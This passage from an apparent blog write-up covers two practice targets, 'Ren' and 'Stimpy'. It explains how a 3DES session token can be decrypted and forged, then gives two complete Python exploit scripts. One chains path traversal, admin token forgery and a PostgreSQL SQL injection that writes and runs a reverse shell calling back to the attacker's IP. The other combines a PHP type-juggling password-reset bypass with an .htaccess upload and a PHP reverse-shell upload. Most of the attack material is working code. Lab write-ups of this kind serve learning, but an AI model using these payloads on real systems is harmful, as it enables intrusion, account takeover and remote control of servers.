</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> plain <span style="color:#ff79c6">=</span> cipher.<span style="color:#50fa7b">doFinal</span>(enc);
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">new</span> String(plain, <span style="color:#f1fa8c">&#34;UTF-8&#34;</span>);
</span></span><span style="display:flex;"><span>        } <span style="color:#ff79c6">catch</span> (Exception e) {
</span></span><span style="display:flex;"><span>            e.<span style="color:#50fa7b">printStackTrace</span>();
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> <span style="color:#f1fa8c">&#34;&#34;</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> String <span style="color:#50fa7b">encryptToken</span>(String user, String token, String uuid) {
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">try</span> {
</span></span><span style="display:flex;"><span>            SecretKey key <span style="color:#ff79c6">=</span> getKeyForUser(user, uuid);
</span></span><span style="display:flex;"><span>            Cipher cipher <span style="color:#ff79c6">=</span> Cipher.<span style="color:#50fa7b">getInstance</span>(<span style="color:#f1fa8c">&#34;DESede/ECB/PKCS5Padding&#34;</span>);
</span></span><span style="display:flex;"><span>            cipher.<span style="color:#50fa7b">init</span>(Cipher.<span style="color:#50fa7b">ENCRYPT_MODE</span>, key);
</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> enc <span style="color:#ff79c6">=</span> cipher.<span style="color:#50fa7b">doFinal</span>(token.<span style="color:#50fa7b">getBytes</span>(<span style="color:#f1fa8c">&#34;UTF-8&#34;</span>));
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> Base64.<span style="color:#50fa7b">getUrlEncoder</span>().<span style="color:#50fa7b">encodeToString</span>(enc);
</span></span><span style="display:flex;"><span>        } <span style="color:#ff79c6">catch</span> (Exception e) {
</span></span><span style="display:flex;"><span>            e.<span style="color:#50fa7b">printStackTrace</span>();
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> <span style="color:#f1fa8c">&#34;&#34;</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">private</span> <span style="color:#8be9fd;font-style:italic">static</span> SecretKey <span style="color:#50fa7b">getKeyForUser</span>(String email, String uuid) <span style="color:#8be9fd;font-style:italic">throws</span> Exception {
</span></span><span style="display:flex;"><span>        MessageDigest md <span style="color:#ff79c6">=</span> MessageDigest.<span style="color:#50fa7b">getInstance</span>(<span style="color:#f1fa8c">&#34;SHA-256&#34;</span>);
</span></span><span style="display:flex;"><span>        String keyText <span style="color:#ff79c6">=</span> uuid <span style="color:#ff79c6">+</span> email;
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> keyArray <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[</span>24<span style="color:#ff79c6">]</span>;
</span></span><span style="display:flex;"><span>        System.<span style="color:#50fa7b">arraycopy</span>(md.<span style="color:#50fa7b">digest</span>(keyText.<span style="color:#50fa7b">getBytes</span>(<span style="color:#f1fa8c">&#34;UTF-8&#34;</span>)), 0, keyArray, 0, 24);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">new</span> SecretKeySpec(keyArray, <span style="color:#f1fa8c">&#34;DESede&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>the <code>decryptToken()</code> method is used to decrypt the session token from the user&rsquo;s session cookie. the UUID is combined with the user&rsquo;s email to create a <strong>3DES</strong> encryption key using the <code>getKeyForUser()</code> method. this key is then used to decrypt the session token (which contains information about the user&rsquo;s privileges, like their role).</p>
<p>here&rsquo;s the annotated code, so you can understand what&rsquo;s going on under the hood.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> String <span style="color:#50fa7b">decryptToken</span>(String user, String token, String uuid) {
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">try</span> {
</span></span><span style="display:flex;"><span>        SecretKey key <span style="color:#ff79c6">=</span> getKeyForUser(user, uuid);  <span style="color:#6272a4">// generate the decryption key</span>
</span></span><span style="display:flex;"><span>        Cipher cipher <span style="color:#ff79c6">=</span> Cipher.<span style="color:#50fa7b">getInstance</span>(<span style="color:#f1fa8c">&#34;DESede/ECB/PKCS5Padding&#34;</span>);  <span style="color:#6272a4">// set up the 3DES cipher</span>
</span></span><span style="display:flex;"><span>        cipher.<span style="color:#50fa7b">init</span>(Cipher.<span style="color:#50fa7b">DECRYPT_MODE</span>, key);  <span style="color:#6272a4">// initialize the cipher for decryption</span>
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> enc <span style="color:#ff79c6">=</span> Base64.<span style="color:#50fa7b">getUrlDecoder</span>().<span style="color:#50fa7b">decode</span>(token.<span style="color:#50fa7b">getBytes</span>(<span style="color:#f1fa8c">&#34;UTF-8&#34;</span>));  <span style="color:#6272a4">// decode the base64 token</span>
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> plain <span style="color:#ff79c6">=</span> cipher.<span style="color:#50fa7b">doFinal</span>(enc);  <span style="color:#6272a4">// decrypt the token</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">new</span> String(plain, <span style="color:#f1fa8c">&#34;UTF-8&#34;</span>);  <span style="color:#6272a4">// return the plaintext token</span>
</span></span><span style="display:flex;"><span>    } <span style="color:#ff79c6">catch</span> (Exception e) {
</span></span><span style="display:flex;"><span>        e.<span style="color:#50fa7b">printStackTrace</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#f1fa8c">&#34;&#34;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">private</span> <span style="color:#8be9fd;font-style:italic">static</span> SecretKey <span style="color:#50fa7b">getKeyForUser</span>(String email, String uuid) <span style="color:#8be9fd;font-style:italic">throws</span> Exception {
</span></span><span style="display:flex;"><span>    MessageDigest md <span style="color:#ff79c6">=</span> MessageDigest.<span style="color:#50fa7b">getInstance</span>(<span style="color:#f1fa8c">&#34;SHA-256&#34;</span>);
</span></span><span style="display:flex;"><span>    String keyText <span style="color:#ff79c6">=</span> uuid <span style="color:#ff79c6">+</span> email;  <span style="color:#6272a4">// concatenate the UUID + email</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> keyArray <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[</span>24<span style="color:#ff79c6">]</span>;  <span style="color:#6272a4">// 3DES key size</span>
</span></span><span style="display:flex;"><span>    System.<span style="color:#50fa7b">arraycopy</span>(md.<span style="color:#50fa7b">digest</span>(keyText.<span style="color:#50fa7b">getBytes</span>(<span style="color:#f1fa8c">&#34;UTF-8&#34;</span>)), 0, keyArray, 0, 24);  <span style="color:#6272a4">// generate the key</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">new</span> SecretKeySpec(keyArray, <span style="color:#f1fa8c">&#34;DESede&#34;</span>);  <span style="color:#6272a4">// return the 3DES key</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>the <code>getKeyForUser()</code> method generates a decryption key by concatenating the UUID and the email, hashes it using <strong>SHA-256</strong>, and truncates the result to 24 bytes (the length needed for 3DES). the 3DES cipher is initialized using the generated key, and the token is decrypted and returned as a <strong>plain text string</strong>.</p>
<p>once the token is decrypted, i can <strong>modify the role</strong> within it to escalate my privileges. all i have to do is append the <code>|1</code> flag (<code>1</code> represents admin status) to the token and re-encrypt it, using the same UUID and the target email.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> String <span style="color:#50fa7b">encryptToken</span>(String user, String token, String uuid) {
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">try</span> {
</span></span><span style="display:flex;"><span>        SecretKey key <span style="color:#ff79c6">=</span> getKeyForUser(user, uuid);  <span style="color:#6272a4">// generate the encryption key</span>
</span></span><span style="display:flex;"><span>        Cipher cipher <span style="color:#ff79c6">=</span> Cipher.<span style="color:#50fa7b">getInstance</span>(<span style="color:#f1fa8c">&#34;DESede/ECB/PKCS5Padding&#34;</span>);
</span></span><span style="display:flex;"><span>        cipher.<span style="color:#50fa7b">init</span>(Cipher.<span style="color:#50fa7b">ENCRYPT_MODE</span>, key);  <span style="color:#6272a4">// initialize the cipher for encryption</span>
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> enc <span style="color:#ff79c6">=</span> cipher.<span style="color:#50fa7b">doFinal</span>(token.<span style="color:#50fa7b">getBytes</span>(<span style="color:#f1fa8c">&#34;UTF-8&#34;</span>));  <span style="color:#6272a4">// encrypt the token</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> Base64.<span style="color:#50fa7b">getUrlEncoder</span>().<span style="color:#50fa7b">encodeToString</span>(enc);  <span style="color:#6272a4">// return the base64-encoded encrypted token</span>
</span></span><span style="display:flex;"><span>    } <span style="color:#ff79c6">catch</span> (Exception e) {
</span></span><span style="display:flex;"><span>        e.<span style="color:#50fa7b">printStackTrace</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#f1fa8c">&#34;&#34;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>here are the complete exploits for both Ren + Stimpy!</p>
<h3 id="exploit-ren">exploit: Ren</h3>
<p>goal: get admin access + execute RCE, using path traversal, token manipulation, and SQL injection.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> time
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> string
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> subprocess
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> base64
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> random
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> sys
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># step 1: set up my IP and target URL</span>
</span></span><span style="display:flex;"><span>my_ip <span style="color:#ff79c6">=</span> sys<span style="color:#ff79c6">.</span>argv[<span style="color:#bd93f9">1</span>]  <span style="color:#6272a4"># attacker IP address is passed as an argument</span>
</span></span><span style="display:flex;"><span>target <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;http://&lt;IP&gt;&#39;</span>     <span style="color:#6272a4"># target application URL</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># step 2: generate random username + email</span>
</span></span><span style="display:flex;"><span>username <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;</span><span style="color:#ff79c6">.</span>join(random<span style="color:#ff79c6">.</span>choice(string<span style="color:#ff79c6">.</span>ascii_lowercase) <span style="color:#ff79c6">for</span> c <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">3</span>))
</span></span><span style="display:flex;"><span>email <span style="color:#ff79c6">=</span> username <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;@ren.local&#39;</span>  <span style="color:#6272a4"># email with the generated username</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># step 3: initialize session and get main page</span>
</span></span><span style="display:flex;"><span>session <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>Session()
</span></span><span style="display:flex;"><span>session<span style="color:#ff79c6">.</span>get(target <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;/&#39;</span>)  <span style="color:#6272a4"># target&#39;s homepage</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># step 4: create an account on the target application</span>
</span></span><span style="display:flex;"><span>session<span style="color:#ff79c6">.</span>post(target <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;/signup&#39;</span>, data<span style="color:#ff79c6">=</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#39;submit&#39;</span>: <span style="color:#f1fa8c">&#39;Submit&#39;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#39;email&#39;</span>: email,
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#39;password&#39;</span>: <span style="color:#f1fa8c">&#39;L0r3m1p$uM&#39;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#39;username&#39;</span>: username
</span></span><span style="display:flex;"><span>})
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># step 5: log in and capture the &#39;rememberme&#39; session token</span>
</span></span><span style="display:flex;"><span>session<span style="color:#ff79c6">.</span>post(target <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;/login&#39;</span>, data<span style="color:#ff79c6">=</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#39;submit&#39;</span>: <span style="color:#f1fa8c">&#39;Submit&#39;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#39;username&#39;</span>: username,
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#39;password&#39;</span>: <span style="color:#f1fa8c">&#39;L0r3m1p$uM&#39;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#39;rememberme&#39;</span>: <span style="color:#ff79c6">True</span>  <span style="color:#6272a4"># remember me token is stored in the session</span>
</span></span><span style="display:flex;"><span>})
</span></span><span style="display:flex;"><span>myuser_token <span style="color:#ff79c6">=</span> session<span style="color:#ff79c6">.</span>cookies<span style="color:#ff79c6">.</span>get_dict()[<span style="color:#f1fa8c">&#34;rememberme&#34;</span>]  <span style="color:#6272a4"># extract the rememberme token</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># step 6: exploit path traversal vulnerability to retrieve UUID</span>
</span></span><span style="display:flex;"><span>uuid <span style="color:#ff79c6">=</span> session<span style="color:#ff79c6">.</span>get(target <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;/download?id=..././conf/uuid&#39;</span>)<span style="color:#ff79c6">.</span>text  <span style="color:#6272a4"># UUID is the encryption key</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># step 7: decrypt the token, modify it to escalate privileges, and re-encrypt</span>
</span></span><span style="display:flex;"><span>process <span style="color:#ff79c6">=</span> subprocess<span style="color:#ff79c6">.</span>Popen([<span style="color:#f1fa8c">&#39;java&#39;</span>, <span style="color:#f1fa8c">&#39;Tokenizer&#39;</span>, myuser_token, email, <span style="color:#f1fa8c">&#39;admin@ren.local&#39;</span>, uuid], stdout<span style="color:#ff79c6">=</span>subprocess<span style="color:#ff79c6">.</span>PIPE)
</span></span><span style="display:flex;"><span>time<span style="color:#ff79c6">.</span>sleep(<span style="color:#bd93f9">5</span>)  <span style="color:#6272a4"># wait for subprocess to complete</span>
</span></span><span style="display:flex;"><span>out, err <span style="color:#ff79c6">=</span> process<span style="color:#ff79c6">.</span>communicate()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># step 8: if there&#39;s an error, print it and exit</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> err:
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(err)
</span></span><span style="display:flex;"><span>    exit()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># step 9: retrieve the admin token from the output</span>
</span></span><span style="display:flex;"><span>tokenadmin <span style="color:#ff79c6">=</span> out<span style="color:#ff79c6">.</span>decode(<span style="color:#f1fa8c">&#34;UTF-8&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># step 10: log in as admin using the manipulated token</span>
</span></span><span style="display:flex;"><span>session<span style="color:#ff79c6">.</span>get(target <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;/login&#39;</span>, cookies<span style="color:#ff79c6">=</span>{<span style="color:#f1fa8c">&#39;rememberme&#39;</span>: tokenadmin})
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># step 11: craft the reverse shell payload and encode it in base64</span>
</span></span><span style="display:flex;"><span>b64payload <span style="color:#ff79c6">=</span> base64<span style="color:#ff79c6">.</span>b64encode(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">import socket, subprocess, os, pty;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">s=socket.socket(socket.AF_INET, socket.SOCK_STREAM);
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">s.connect((&#34;</span><span style="color:#f1fa8c">{</span>my_ip<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;, 4444));  # Connect to my IP
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">os.dup2(s.fileno(), 0);  # Redirect stdin
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">os.dup2(s.fileno(), 1);  # Redirect stdout
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">os.dup2(s.fileno(), 2);  # Redirect stderr
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">pty.spawn(&#34;/bin/bash&#34;)  # Spawn a bash shell
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#39;&#39;&#39;</span><span style="color:#ff79c6">.</span>encode(<span style="color:#f1fa8c">&#39;utf-8&#39;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># step 12: exploit SQL injection vulnerability to run the reverse shell</span>
</span></span><span style="display:flex;"><span>session<span style="color:#ff79c6">.</span>get(target <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;/admin/users/category?id=1; COPY(SELECT convert_from(decode(&#39;&#34;</span> <span style="color:#ff79c6">+</span> b64payload<span style="color:#ff79c6">.</span>decode(<span style="color:#f1fa8c">&#39;utf-8&#39;</span>) <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;&#39;, &#39;base64&#39;), &#39;utf-8&#39;)) to &#39;/tmp/shell.py&#39;; DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM &#39;python3 /tmp/shell.py&#39;;&#34;</span>)
</span></span></code></pre></div><h3 id="exploit-stimpy">exploit: Stimpy</h3>
<p>goal: gain admin access + RCE using type juggling and arbitrary file upload.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> re
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> time
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> sys
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># step 1: set up my IP and target URL</span>
</span></span><span style="display:flex;"><span>my_ip <span style="color:#ff79c6">=</span> sys<span style="color:#ff79c6">.</span>argv[<span style="color:#bd93f9">1</span>]  <span style="color:#6272a4"># IP</span>
</span></span><span style="display:flex;"><span>target <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;http://&lt;IP&gt;&#34;</span>     <span style="color:#6272a4"># target URL</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># step 2: admin account details</span>
</span></span><span style="display:flex;"><span>email <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;admin@stimpy.tld&#34;</span>  <span style="color:#6272a4"># admin email to target</span>
</span></span><span style="display:flex;"><span>password <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;L0r3m1p$uM&#39;</span>   <span style="color:#6272a4"># new admin password to set</span>
</span></span><span style="display:flex;"><span>ts <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">int</span>(time<span style="color:#ff79c6">.</span>time())       <span style="color:#6272a4"># generate timestamp for the reset link</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># step 3: initialize session and open target&#39;s homepage</span>
</span></span><span style="display:flex;"><span>session <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>Session()
</span></span><span style="display:flex;"><span>session<span style="color:#ff79c6">.</span>get(target)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># step 4: function to request a password reset link</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">ResetLink</span>():
</span></span><span style="display:flex;"><span>    session<span style="color:#ff79c6">.</span>post(target <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;/forgot&#39;</span>, data<span style="color:#ff79c6">=</span>{<span style="color:#f1fa8c">&#39;email&#39;</span>: email})
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># step 5: function to test if reset token is valid using type juggling</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">Test</span>():
</span></span><span style="display:flex;"><span>    resp <span style="color:#ff79c6">=</span> session<span style="color:#ff79c6">.</span>get(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">{</span>target<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">/reset/1/</span><span style="color:#f1fa8c">{</span>ts<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">/0e123456&#39;</span>)  <span style="color:#6272a4"># type juggling with magic hash</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> <span style="color:#f1fa8c">&#34;Reset your password below&#34;</span> <span style="color:#ff79c6">in</span> resp<span style="color:#ff79c6">.</span>text:
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">True</span>  <span style="color:#6272a4"># success, token accepted</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">else</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">False</span>  <span style="color:#6272a4"># try again</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># step 6: brute force magic hash and change admin password</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">while</span> <span style="color:#ff79c6">True</span>:
</span></span><span style="display:flex;"><span>    ResetLink()  <span style="color:#6272a4"># request password reset link</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> Test():  <span style="color:#6272a4"># check if reset link is accepted</span>
</span></span><span style="display:flex;"><span>        session<span style="color:#ff79c6">.</span>post(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">{</span>target<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">/reset/1/</span><span style="color:#f1fa8c">{</span>ts<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">/0e123456&#39;</span>, data<span style="color:#ff79c6">=</span>{<span style="color:#f1fa8c">&#39;password&#39;</span>: password})  <span style="color:#6272a4"># reset password</span>
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#39;hell yeah brother!&#39;</span>)  <span style="color:#6272a4"># success message</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">break</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># step 7: log in as admin using the new password</span>
</span></span><span style="display:flex;"><span>session<span style="color:#ff79c6">.</span>post(target <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;/login&#39;</span>, data<span style="color:#ff79c6">=</span>{<span style="color:#f1fa8c">&#39;email&#39;</span>: email, <span style="color:#f1fa8c">&#39;password&#39;</span>: password})
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># step 8: exploit arbitrary file upload to gain RCE</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># upload .htaccess to allow execution of PHP files with unusual extensions</span>
</span></span><span style="display:flex;"><span>session<span style="color:#ff79c6">.</span>post(target <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;/import&#39;</span>, files<span style="color:#ff79c6">=</span>{<span style="color:#f1fa8c">&#39;file&#39;</span>: (<span style="color:#f1fa8c">&#39;.htaccess&#39;</span>, <span style="color:#f1fa8c">&#39;RewriteEngine on</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">RewriteRule shell.php shell.php6&#39;</span>)})
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># step 9: upload reverse shell as PHP6 file</span>
</span></span><span style="display:flex;"><span>session<span style="color:#ff79c6">.</span>post(target <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;/import&#39;</span>, files<span style="color:#ff79c6">=</span>{<span style="color:#f1fa8c">&#39;file&#39;</span>: (<span style="color:#f1fa8c">&#39;shell.php6&#39;</span>, <span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#39;&lt;?php $s=fsockopen(&#34;</span><span style="color:#f1fa8c">{</span>my_ip<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;, 4444); $p=proc_open(&#34;/bin/sh -i&#34;, array(0=&gt;$s, 1=&gt;$s, 2=&gt;$s), $pipes); ?&gt;&#39;</span>)})
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># step 10: execute the reverse shell</span>
</span></span><span style="display:flex;"><span>session<span style="color:#ff79c6">.</span>get(target <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;/imports/shell.php&#39;</span>)
</span></span></code></pre></div></main>



<footer>
  <div class="footer-nav">
    
    <a class="next" href="/posts/new_post10/" style="float: right"
      >next: reading list [updated]</a
    >
     
    <a class="previous" href="/posts/cosmos-2/">previous</a>
    
  </div>
</footer>



<script defer>
  document.addEventListener("keydown", function (e) {
    if (document.activeElement.isContentEditable) {
      return false;
    }
    if (document.activeElement.tagName == "INPUT") {
      return false;
    }
    if (e.altKey || e.ctrlKey || e.shiftKey) {
      return false;
    }
    var key = e.key;
    if (key === "h") {
      e.preventDefault();
      e.stopPropagation();
      window.location.href = "/";
    } else if (key === "t") {
      e.preventDefault();
      e.stopPropagation();
      window.location.href = `https://${location.hostname}/tags`;
    } else if (key === "i") {
      e.preventDefault();
      e.stopPropagation();
      const inputs = document.querySelectorAll("input");
      for (let i = 0; i < inputs.length; i++) {
        if (inputs[i].offsetParent !== null) {
          inputs[i].selectionStart = inputs[i].selectionEnd =
            inputs[i].value.length;
          inputs[i].focus();
          break;
        }
      }
    }
    return false;
  });
</script>


<script defer>
  function throttle(fn, wait) {
    var time = Date.now();
    return function () {
      var now = Date.now()
      if (time + wait - now < 0) {
        fn();
        time = now;
      }
    };
  }

  function scrollHandler() {
    const anchors = Array.from(document.querySelectorAll("body h2, body h3"));

    function scrollCallback() {
      var scrollTop = window.pageYOffset || document.documentElement.scrollTop;

      
      for (var i = 0; i < anchors.length; i++) {
        var anchorId = anchors[i].getAttribute("id");
        var link = document.querySelector(
          'nav ul li a[href="#' + anchorId + '"]',
        );
        if (link) {
          link.classList.remove("active-toc");
        }
      }

      
      for (var i = anchors.length - 1; i >= 0; i--) {
        var offsetTop = anchors[i].offsetTop;
        if (scrollTop > offsetTop - 75) {
          var anchorId = anchors[i].getAttribute("id");
          var link = document.querySelector(
            'nav ul li a[href="#' + anchorId + '"]',
          );
          if (link) {
            link.classList.add("active-toc");
            break;
          }
        }
      }
    }

    window.addEventListener(
      "scroll",
      throttle(scrollCallback, 300),
    );
  }
  setTimeout(scrollHandler, 100);
</script>

<script defer>
